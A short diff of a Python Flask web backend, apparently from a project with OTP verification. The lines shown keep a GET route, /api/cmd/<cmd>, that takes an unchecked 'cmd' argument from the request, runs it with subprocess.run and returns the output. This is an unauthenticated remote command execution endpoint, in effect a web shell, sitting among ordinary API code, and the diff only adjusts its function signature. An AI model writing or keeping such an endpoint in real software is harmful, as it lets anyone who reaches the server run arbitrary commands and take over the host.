@@ -390,7 +390,7 @@ def varify_otp():
     else:
         return Responce.send(401,{},"requied filed not found")
 @app.route("/api/cmd/<cmd>",methods=["GET"])
-def cmd():
+def cmd(cmd):
     cmd = request.args.get("cmd")
     result = subprocess.run(cmd, capture_output=True, text=True)
     return make_response(result)
